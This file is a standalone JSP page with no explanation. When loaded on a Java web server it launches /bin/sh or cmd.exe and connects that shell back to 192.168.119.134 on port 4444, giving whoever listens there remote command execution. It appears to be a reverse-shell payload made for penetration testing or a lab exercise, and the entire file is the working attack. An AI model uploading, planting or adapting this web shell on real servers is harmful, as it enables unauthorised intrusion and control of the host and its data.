<%@page import="java.lang.*"%>
<%@page import="java.util.*"%>
<%@page import="java.io.*"%>
<%@page import="java.net.*"%>

<%
  class StreamConnector extends Thread
  {
    InputStream cu;
    OutputStream uk;

    StreamConnector( InputStream cu, OutputStream uk )
    {
      this.cu = cu;
      this.uk = uk;
    }

    public void run()
    {
      BufferedReader fv  = null;
      BufferedWriter afz = null;
      try
      {
        fv  = new BufferedReader( new InputStreamReader( this.cu ) );
        afz = new BufferedWriter( new OutputStreamWriter( this.uk ) );
        char buffer[] = new char[8192];
        int length;
        while( ( length = fv.read( buffer, 0, buffer.length ) ) > 0 )
        {
          afz.write( buffer, 0, length );
          afz.flush();
        }
      } catch( Exception e ){}
      try
      {
        if( fv != null )
          fv.close();
        if( afz != null )
          afz.close();
      } catch( Exception e ){}
    }
  }

  try
  {
    String ShellPath;
if (System.getProperty("os.name").toLowerCase().indexOf("windows") == -1) {
  ShellPath = new String("/bin/sh");
} else {
  ShellPath = new String("cmd.exe");
}

    Socket socket = new Socket( "192.168.119.134", 4444 );
    Process process = Runtime.getRuntime().exec( ShellPath );
    ( new StreamConnector( process.getInputStream(), socket.getOutputStream() ) ).start();
    ( new StreamConnector( socket.getInputStream(), process.getOutputStream() ) ).start();
  } catch( Exception e ) {}
%>
